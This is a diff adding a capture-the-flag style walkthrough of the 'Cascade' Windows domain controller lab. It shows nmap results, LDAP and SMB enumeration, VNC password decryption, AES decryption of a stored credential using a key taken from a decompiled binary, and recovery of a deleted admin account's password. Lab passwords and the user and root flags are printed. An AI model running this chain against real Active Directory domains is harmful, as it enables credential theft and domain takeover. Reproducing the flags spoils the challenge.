@@ -1,0 +1,89 @@
+* Cascade
+** Enumeration
+*** meta
+# Nmap 7.80 scan initiated Tue May 12 05:32:20 2020 as: nmap -Pn -sC -sV -oA logs/nmap 10.10.10.182
+Nmap scan report for 10.10.10.182
+Host is up (0.016s latency).
+Not shown: 986 filtered ports
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+*** 53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+*** 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-13 14:02:22Z)
+*** 135/tcp   open  msrpc         Microsoft Windows RPC
+*** 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+*** 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+*** *** 445/tcp   open  microsoft-ds?
+*** 636/tcp   open  tcpwrapped
+*** 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+*** 3269/tcp  open  tcpwrapped
+*** 49154/tcp open  msrpc         Microsoft Windows RPC
+*** 49155/tcp open  msrpc         Microsoft Windows RPC
+*** 49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+*** 49158/tcp open  msrpc         Microsoft Windows RPC
+*** 49165/tcp open  msrpc         Microsoft Windows RPC
+** Foothold
+   
+~rpcclient~ to enumerate users and details
+~smbclient~ doesn't work without password for any user
+~GetNPUsers~ doesn't work for any account
+~dig -x $TARGET @$TARGET~ doesn't reveal any DNS domains
+
+Of enumerated users, only these have logged on, so they are probably the real targets:
+ * arksvc
+ * s.smith
+ * r.thompson
+ * util
+   
+Apparently the key tool is ~ldapsearch~
+https://www.splunk.com/en_us/blog/tips-and-tricks/ldapsearch-is-your-friend.html
+
+~ldapsearch -h $TARGET -p 389 -x -b "dc=cascade,dc=local"~
+
+Doing so gets a password for ~r.thompson~ and access to some SMB shares.
+
+** Lateral Movement
+
+Interesting things in the SMB shares:
+ * an archived email about a new temporary admin user: ~TempAdmin~ (with the same password as the 'normal' admin account)
+ * a hex encoded password in ~s.smith~'s VNC install log
+ * some data about how files were moved in the past in a logfile (~TempAdmin~ is mentioned again!)
+   
+For decrypting the VNC password: 
+https://github.com/frizb/PasswordDecrypts, the suggested path with  ~msfconsole~ works -- annoying there isn't a standalone tool.
+
+these creds get us in with ~evil-winrm~
+USER: 1c3cd13751c4038615f411e13e8ea402
+
+** Escalation
+
+s.smith provides access to a new SMB share, ~Audit$~. 
+
+Inside is a binary ~CascAudit.exe~ and a sqlite database.
+
+Decompile the exe with ~ILSpy~, it selects out passwords from the database and decrypts them, so we can do the same thing with CyberChef.
+
+http://icyberchef.com/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true/disabled)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,%7B'option':'Hex','string':''%7D,'CBC','Pkcs7','Base64','UTF8'/disabled)&input=WW1GRFZETnlNV0ZPTURCa2JHVno9
+
+#+BEGIN_SRC sql
+sqlite> select * from ldap;
+1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
+#+END_SRC
+
+Replicated the decryption with CyberChef and we have a password: w3lc0meFr31nd
+
+Once in as ~arksvc~, we can query for the deleted ~TempAdmin~
+
+https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/
+https://docs.microsoft.com/en-us/powershell/module/activedirectory/Get-ADUser?view=winserver2012-ps
+https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html
+
+~Get-ADObject -Filter {displayName -eq "TempAdmin"} -includeDeletedObjects -Properties *~
+
+Which shows the cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
+
+Unfortunately, the existing CyberChef recipe doesn't seem to decode it. :(
+
+But just plain b64 decoding does!
+
+ROOT: a2e363fd37a1ddc07c03f60edf1b8165
